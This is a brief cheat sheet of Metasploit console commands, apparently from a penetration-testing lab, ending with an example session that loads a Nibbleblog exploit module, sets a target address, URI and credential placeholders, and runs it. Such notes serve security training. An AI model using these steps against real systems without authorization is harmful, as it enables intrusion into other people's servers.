msfconosle

|        |        |
|--------|--------|
| search | Allows you to search from the Metasploit database based on the given protocol/application/parameter
| use    | Allows you to choose a particular module and changes the context to module-specific commands
| info   | Provides information about the selected module
| show   | Displays information about the given module name and options for the current module
| check  | Checks if the target system has a vulnerability
| set    | It's a context-specific variable that configures options for the current module
| unset  | Removes previously set parameters
| run    | Executes the current module
| debug  | Shows useful information when exploit is not working (execute right after exploit)

Example>
`search nibble`
`use 0` - use module with index 0 from last seach
`set RHOST 10.129.96.84`
`set TARGETURI /nibbleblog/admin.php`
`set USERNAME <username>`
`set PASSWORD <password>`
`check` - 'The target appears to vulnerable'
`run`
